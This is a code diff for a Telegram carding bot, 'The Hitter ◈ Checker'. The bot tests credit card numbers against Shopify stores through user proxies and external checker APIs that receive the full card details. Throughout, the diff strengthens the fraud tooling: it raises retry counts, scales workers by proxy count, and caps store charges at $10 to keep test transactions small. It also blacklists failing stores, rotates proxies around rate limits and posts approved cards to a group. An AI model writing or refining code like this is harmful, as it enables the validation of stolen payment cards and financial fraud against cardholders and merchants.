@@ -48,7 +48,7 @@ TG_API    = f"https://api.telegram.org/bot{BOT_TOKEN}"
 BOT_BRAND        = 'The Hitter ◈ Checker'
 OWNER_NAME       = 'Tahjir Tansim'
 OWNER_USERNAME   = 'Tahjir_Tansim'
-OWNER_ID         = 8054789773
+OWNER_ID = 8257983079
 _EXTRA_OWNER_IDS = {1061332930}
 DEV_LINE         = f'💻 <b>Dev</b>  »  <a href="https://t.me/{OWNER_USERNAME}">{OWNER_NAME}</a>'
 
@@ -517,21 +517,24 @@ def _is_valid_url(u: str) -> bool:
     return bool(_URL_RE.match((u or '').strip()))
 
 async def _fetch_github_sites() -> list:
-    if not GITHUB_REPO or not GITHUB_TOKEN:
+    if not GITHUB_REPO:
         return []
     url = f"https://raw.githubusercontent.com/{GITHUB_REPO}/{GITHUB_BRANCH}/{GITHUB_SITES_FILE}"
     try:
         timeout = httpx.Timeout(connect=8.0, read=30.0, write=5.0, pool=5.0)
         async with httpx.AsyncClient(timeout=timeout, verify=False) as c:
-            r = await c.get(url, headers={
-                "Authorization": f"token {GITHUB_TOKEN}",
+            headers = {
                 "Accept": "application/vnd.github.v3.raw",
                 "User-Agent": "TheHitterBot",
-            })
+            }
+            if GITHUB_TOKEN:
+                headers["Authorization"] = f"token {GITHUB_TOKEN}"
+            r = await c.get(url, headers=headers)
             if r.status_code != 200:
                 return []
-            return [ln.strip() for ln in r.text.splitlines()
-                    if ln.strip() and not ln.strip().startswith('#')]
+            raw = [ln.strip() for ln in r.text.splitlines()
+                   if ln.strip() and not ln.strip().startswith('#')]
+            return [u for u in raw if u not in _BLACKLIST]
     except Exception:
         return []
 
@@ -597,6 +600,14 @@ def extract_cc(text: str) -> list:
             year = '20' + year
         cards.append(f"{card}|{month}|{year}|{cvv}")
     return cards
+
+def calc_workers(proxy_count: int, max_cap: int = 40) -> int:
+    """Calculate safe worker count from user's proxy count.
+    Rule: 1 proxy = 2 workers, capped at max_cap.
+    """
+    if proxy_count <= 0:
+        return 0
+    return min(max_cap, proxy_count * 2)
 
 def make_progress_bar(current, total, width=20) -> str:
     if total == 0:
@@ -712,7 +723,7 @@ def build_result_card(result: dict, bin_info: tuple, uid: int, cname: str) -> st
 #  CHECK ENGINE
 # ════════════════════════════════════════════════════════════
 CHECKER_API  = os.environ.get("CHECKER_API_URL", "http://localhost:8099")
-_API_TIMEOUT = httpx.Timeout(connect=5.0, read=45.0, write=5.0, pool=10.0)
+_API_TIMEOUT = httpx.Timeout(connect=5.0, read=60.0, write=5.0, pool=10.0)
 
 _http_client: httpx.AsyncClient | None = None
 _client_lock = asyncio.Lock()
@@ -725,7 +736,7 @@ async def _get_client() -> httpx.AsyncClient:
     async with _client_lock:
         if _http_client is None or _http_client.is_closed:
             _http_client = httpx.AsyncClient(
-                timeout=_API_TIMEOUT,
+                timeout=httpx.Timeout(connect=15.0, read=60.0, write=10.0, pool=15.0),
                 limits=httpx.Limits(
                     max_connections=500,
                     max_keepalive_connections=100,
@@ -748,28 +759,88 @@ def _make_result(card, status, message, price='-', gateway='Shopify Payments',
         'time':        time,
     }
 
+MAX_STORE_AMOUNT = 10.00
+AUTO_PRUNE_SITES = True
+_BLACKLIST_FILE = os.path.join(os.path.dirname(__file__), 'fake_stores.txt')
+_BLACKLIST = set()
+
+def _load_blacklist():
+    global _BLACKLIST
+    if os.path.exists(_BLACKLIST_FILE):
+        try:
+            with open(_BLACKLIST_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+                _BLACKLIST = {ln.strip() for ln in f if ln.strip() and not ln.strip().startswith('#')}
+        except Exception:
+            _BLACKLIST = set()
+
+def _add_to_blacklist(url):
+    if not url or url in _BLACKLIST:
+        return
+    _BLACKLIST.add(url)
+    try:
+        with open(_BLACKLIST_FILE, 'a', encoding='utf-8') as f:
+            f.write(url + '\n')
+    except Exception:
+        pass
+
+def _parse_amount(price_str):
+    if not price_str:
+        return None
+    import re as _r
+    m = _r.search(r'([\d,]+(?:\.\d+)?)', str(price_str))
+    if not m:
+        return None
+    try:
+        return float(m.group(1).replace(',', ''))
+    except ValueError:
+        return None
+
+def _store_over_cap(result):
+    amt = _parse_amount(result.get('price'))
+    if amt is None:
+        return False, ''
+    if amt > MAX_STORE_AMOUNT:
+        return True, 'Store $%.2f > $%.2f cap' % (amt, MAX_STORE_AMOUNT)
+    return False, ''
+
+def _prune_site_from_disk(url):
+    try:
+        if not os.path.exists(SITES_FILE):
+            return
+        with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
+            lines = f.read().splitlines()
+        cleaned = [ln for ln in lines if ln.strip() != url]
+        if len(cleaned) == len(lines):
+            return
+        with open(SITES_FILE, 'w', encoding='utf-8') as f:
+            for ln in cleaned:
+                f.write(ln + '\n')
+    except Exception:
+        pass
+
+def _prune_site(url):
+    if not url:
+        return
+    mark_site_dead(url)
+    if AUTO_PRUNE_SITES:
+        _prune_site_from_disk(url)
+        _add_to_blacklist(url)
+
+_load_blacklist()
+
 CHECKER_APIS = [
     {
         "name":      "shopify",
         "builder":   lambda s, c, p: f"https://web-production-0919d.up.railway.app/shopify?site={s}&cc={c}&proxy={p}",
         "normalize": "_normalize_multi",
-    },
-    {
-        "name":      "stripe",
-        "builder":   lambda s, c, p: f"https://web-production-ce19f.up.railway.app/gateway=AutoStripe/key=md-tech1/site={s}/cc={c}/proxy={p}",
-        "normalize": "_normalize_multi",
-    },
-    {
-        "name":      "selfhost",
-        "builder":   lambda s, c, p: f"https://5.83.134.51/check?card={c}&url={s}&proxy={p}",
-        "normalize": "_normalize_selfhost",
-        "verify_ssl": False,
-    },
-]
+    },]
 
-_MULTI_TIMEOUT = httpx.Timeout(connect=6.0, read=45.0, write=6.0, pool=10.0)
+_MULTI_TIMEOUT = httpx.Timeout(connect=15.0, read=60.0, write=6.0, pool=10.0)
 
 _TRANSIENT_SIGNALS = (
+    'decision rule', 'decision_rule',
+    'rate limit', 'rate-limit', 'throttl',
+
     'connection_error', 'connection timed out', 'connection timeout', 'timed out', 'timeout',
     'unavailable', 'required_artifacts_unavailable',
     'pci_token_failed', 'graph_error', 'graphql', 'storefront graphql',
@@ -781,6 +852,13 @@ _TRANSIENT_SIGNALS = (
     'captcha_required',
 )
 
+_SITE_DEAD_SIGNALS = (
+    'graph_error', 'storefront graphql', 'graphql',
+    'not found', 'store not found', 'site not found',
+    'no such store', 'invalid store', 'store inactive',
+    'store closed', 'shop closed',
+)
+
 def _is_transient(response: str, gateway: str = "") -> bool:
     r = (response or '').lower()
     g = (gateway or '').lower()
@@ -788,6 +866,8 @@ def _is_transient(response: str, gateway: str = "") -> bool:
         return True
     if not r:
         return True
+    if any(s in r for s in _SITE_DEAD_SIGNALS):
+        return False
     return any(s in r for s in _TRANSIENT_SIGNALS)
 
 def _is_blocked_gateway(gateway: str) -> bool:
@@ -888,7 +968,13 @@ async def _call_api_direct(api: dict, shop_url: str, card: str, proxy_raw: str):
     url = api["builder"](shop_url, card, proxy_raw or "")
     verify = api.get("verify_ssl", True)
     try:
-        r = await c.get(url, timeout=_MULTI_TIMEOUT, verify=verify)
+        # httpx: verify is client-level, not per-request. Use a dedicated
+        # client when SSL verification needs to be disabled.
+        if verify:
+            r = await c.get(url, timeout=_MULTI_TIMEOUT)
+        else:
+            async with httpx.AsyncClient(timeout=_MULTI_TIMEOUT, verify=False) as cc:
+                r = await cc.get(url)
         if r.status_code != 200:
             return None
         data = r.json()
@@ -967,7 +1053,7 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
         return _make_result(card, 'Dead', 'No proxy configured')
 
     last_err     = 'Unknown error'
-    MAX_TRIES    = 8
+    MAX_TRIES    = 30
     failed_sites = set()
 
     for attempt in range(MAX_TRIES):
@@ -985,21 +1071,37 @@ async def check_card_with_retry(card, sites, proxies, max_retries=2, start_proxy
 
         if result['status'] in ('Charged', 'Approved'):
             result['proxy'] = proxy_raw
+            over, reason = _store_over_cap(result)
+            if over:
+                _prune_site(shop_url)
+                failed_sites.add(shop_url)
+                last_err = reason
+                await asyncio.sleep(0.05)
+                continue
             return result
+
+        over, reason = _store_over_cap(result)
+        if over:
+            _prune_site(shop_url)
+            failed_sites.add(shop_url)
+            last_err = reason
+            await asyncio.sleep(0.05)
+            continue
 
         if result['status'] == 'Dead' and not result.get('retry'):
             return result
 
         last_err = result.get('message', 'Retryable error')
-        failed_sites.add(shop_url)
 
         low = last_err.lower()
+        if _is_proxy_err(last_err) or 'proxy' in low:
+            await asyncio.sleep(0.15)
+            continue
+        failed_sites.add(shop_url)
         if '429' in low or 'rate limit' in low or 'too many' in low:
-            await asyncio.sleep(1.5)
-        elif _is_proxy_err(last_err):
-            await asyncio.sleep(0.5)
+            await asyncio.sleep(1.0)
         else:
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.15)
 
     _log_error_card(card, last_err)
     return _make_result(card, 'Dead', last_err)
@@ -1176,6 +1278,8 @@ def _should_post_to_gc(result: dict) -> bool:
     status = result.get('status', '')
     msg    = (result.get('message', '') or '').lower()
     if status == 'Charged':
+        return True
+    if status == 'Approved':
         return True
     if 'insufficient' in msg:
         return True
@@ -1508,7 +1612,7 @@ def _is_insuf(msg: str) -> bool:
     return 'insufficient' in (msg or '').lower()
 
 def has_user_proxy(uid: int) -> bool:
-    return bool(get_user_proxies(uid))
+    return bool(get_proxies_for_user(uid))
 
 PROXY_REQUIRED_MSG = pe(
     f"❌ <b>No Proxy Configured</b>\n"
@@ -1746,6 +1850,12 @@ async def run_mass_check(user_id, cards, progress_msg_id):
         'total': len(cards), 'start_time': time.time(), 'last_card_time': time.time(),
     }
     proxy_pool = list(get_proxies_for_user(user_id) or load_proxies())
+    # Auto-scale workers based on user's proxy count (1 proxy = 2 workers, max 40)
+    user_workers = calc_workers(len(proxy_pool), max_cap=40)
+    if user_workers <= 0:
+        user_workers = MASS_WORKERS
+    print(f"[MASS] user={user_id} proxies={len(proxy_pool)} workers={user_workers} cards={len(cards)}")
+    random.shuffle(proxy_pool)
     proxy_iter = itertools.cycle(proxy_pool) if proxy_pool else None
     proxy_lock = asyncio.Lock()
 
@@ -1782,7 +1892,10 @@ async def run_mass_check(user_id, cards, progress_msg_id):
                 t0 = time.time()
                 result = {'card': card, 'status': 'Dead', 'message': 'Error'}
                 try:
-                    result = await check_card_with_retry(card, cur_sites, proxy_pool, max_retries=3)
+                    result = await asyncio.wait_for(
+                        check_card_with_retry(card, cur_sites, proxy_pool, max_retries=3),
+                        timeout=120.0,
+                    )
                     result['time'] = round(time.time() - t0, 2)
                     all_results['last_card_time'] = time.time()
                     st    = result.get('status', '')
@@ -1809,7 +1922,11 @@ async def run_mass_check(user_id, cards, progress_msg_id):
                         await send_insufficient_log(user_id, result)
                     else:
                         all_results['dead'].append(result)
-                except Exception:
+                except Exception as e:
+                    import traceback
+                    print(f"[WORKER-ERR] card={card} err={type(e).__name__}: {e}")
+                    traceback.print_exc()
+                    result['message'] = f'Exception: {type(e).__name__}: {str(e)[:100]}'
                     all_results['dead'].append(result)
 
                 checked = (len(all_results['charged']) + len(all_results['approved']) +
@@ -1822,7 +1939,7 @@ async def run_mass_check(user_id, cards, progress_msg_id):
                     except Exception:
                         pass
 
-        workers = [asyncio.create_task(worker()) for _ in range(min(MASS_WORKERS, len(cards)))]
+        workers = [asyncio.create_task(worker()) for _ in range(min(user_workers, len(cards)))]
         await asyncio.gather(*workers)
 
     except Exception:
@@ -1916,7 +2033,7 @@ async def single_check(event):
         ), parse_mode='html')
         return
 
-    if not get_user_proxies(uid):
+    if not get_proxies_for_user(uid):
         await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
         return
 
@@ -1958,16 +2075,34 @@ async def single_check(event):
         if _should_post_to_gc(result):
             await _post_gc_log(result, cname)
     except Exception as e:
+        import traceback
+        tb = traceback.format_exc()
+        print("=== /sh EXCEPTION ===")
+        print(tb)
+        print("=====================")
         await smsg.edit(pe(f"❌ <b>Check Failed</b>\n<b>{SEP}</b>\n⚠️ Error: <code>{e}</code>"), parse_mode='html')
 
 @bot.on(events.NewMessage(pattern=r'^/ady\s+'))
 async def adyen_direct_check(event):
     uid = event.sender_id
+
+    await event.reply(pe(
+        f"\U0001f6e0\ufe0f <b>/ady \u2014 Under Maintenance</b>\n"
+        f"<b>{SEP}</b>\n"
+        f"This command is temporarily disabled while we upgrade\n"
+        f"the Adyen 3DS pipeline. We'll announce when it's back.\n"
+        f"<b>{SEP}</b>\n"
+        f"\u23f1\ufe0f <b>ETA:</b> Short \u2014 come back soon\n"
+        f"<b>{SEP}</b>\n"
+        f"{DEV_LINE}"
+    ), parse_mode='html')
+    return
+
     if not is_premium(uid):
         await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
         return
 
-    if not get_user_proxies(uid):
+    if not get_proxies_for_user(uid):
         await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
         return
 
@@ -2018,6 +2153,18 @@ async def adyen_direct_check(event):
 @bot.on(events.NewMessage(pattern=r'^/hit(\s|$)'))
 async def hit_command(event):
     uid = event.sender_id
+
+    await event.reply(pe(
+        f"\U0001f6e0\ufe0f <b>/hit \u2014 Under Maintenance</b>\n"
+        f"<b>{SEP}</b>\n"
+        f"This command is temporarily disabled while we upgrade\n"
+        f"the Stripe pipeline. We'll announce when it's back.\n"
+        f"<b>{SEP}</b>\n"
+        f"\u23f1\ufe0f <b>ETA:</b> Short \u2014 come back soon\n"
+        f"<b>{SEP}</b>\n"
+        f"{DEV_LINE}"
+    ), parse_mode='html')
+    return
 
     if not is_premium(uid):
         await event.reply(pe(
@@ -2621,6 +2768,41 @@ async def reloadsites_command(event):
         f"{DEV_LINE}"
     ), parse_mode='html')
 
+@bot.on(events.NewMessage(pattern=r'^/blacklist$'))
+async def blacklist_cmd(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe('\u274c <b>Admin only.</b>'), parse_mode='html')
+        return
+    total = len(_BLACKLIST)
+    if not total:
+        await event.reply(pe('\U0001f4cb <b>Blacklist</b>\n<b>' + SEP + '</b>\nEmpty.'), parse_mode='html')
+        return
+    preview = '\n'.join('  %d. <code>%s</code>' % (i+1, u[:60]) for i, u in enumerate(list(_BLACKLIST)[:15]))
+    more = ('\n  <i>+%d more</i>' % (total-15)) if total > 15 else ''
+    await event.reply(pe(
+        '\U0001f4cb <b>Blacklist  (' + str(total) + ')</b>\n'
+        '<b>' + SEP + '</b>\n' + preview + more + '\n'
+        '<b>' + SEP + '</b>\nClear: <code>/clearblacklist</code>'
+    ), parse_mode='html')
+
+@bot.on(events.NewMessage(pattern=r'^/clearblacklist$'))
+async def clearblacklist_cmd(event):
+    if not is_admin(event.sender_id):
+        await event.reply(pe('\u274c <b>Admin only.</b>'), parse_mode='html')
+        return
+    global _BLACKLIST
+    old_count = len(_BLACKLIST)
+    _BLACKLIST = set()
+    try:
+        open(_BLACKLIST_FILE, 'w').close()
+    except Exception:
+        pass
+    await event.reply(pe(
+        '\u2705 <b>Blacklist cleared</b>\n'
+        '<b>' + SEP + '</b>\n\U0001f5d1\ufe0f Removed ' + str(old_count) + ' sites\n'
+        '<b>' + SEP + '</b>\nRun <code>/reloadsites</code> to restore'
+    ), parse_mode='html')
+
 @bot.on(events.NewMessage(pattern=r'^/sitescount$'))
 async def sitescount_command(event):
     if not is_admin(event.sender_id):
@@ -2651,7 +2833,7 @@ async def txt_detected(event):
     if not is_premium(uid):
         await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
         return
-    if not get_user_proxies(uid):
+    if not get_proxies_for_user(uid):
         await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
         return
     sites   = get_user_sites(uid) or get_live_sites()
@@ -2706,7 +2888,7 @@ async def mass_check_cmd(event):
         await event.reply(pe(f"❌ <b>Access Denied</b>"), parse_mode='html')
         return
 
-    if not get_user_proxies(uid):
+    if not get_proxies_for_user(uid):
         await event.reply(PROXY_REQUIRED_MSG, parse_mode='html')
         return
 
@@ -3182,11 +3364,14 @@ async def cb_close(event):
 @bot.on(events.CallbackQuery(pattern=b"stop_mass"))
 async def cb_stop_mass(event):
     uid = event.sender_id
+    print(f"[STOP] Button pressed by uid={uid}")
+    print(f"[STOP] Active sessions: {list(active_sessions.keys())}")
     killed = 0
     for k in list(active_sessions.keys()):
         if k.startswith(f"{uid}_"):
             active_sessions.pop(k, None)
             killed += 1
+    print(f"[STOP] Killed {killed} session(s)")
     if killed:
         await event.answer("⛔ Mass check stopped!", alert=True)
         try:
@@ -3499,6 +3684,8 @@ def _register_commands():
         {"command": "rmsite",      "description": "🗑️ Remove site"},
         {"command": "reloadsites", "description": "🔄 Reload sites from GitHub"},
         {"command": "sitescount",  "description": "📊 Sites count"},
+        {"command": "blacklist",   "description": "View pruned sites"},
+        {"command": "clearblacklist", "description": "Clear blacklist"},
         {"command": "addproxy",    "description": "📡 Add proxy to shared pool"},
         {"command": "clearproxy",  "description": "🗑️ Clear pool"},
         {"command": "broadcast",   "description": "📢 Broadcast"},
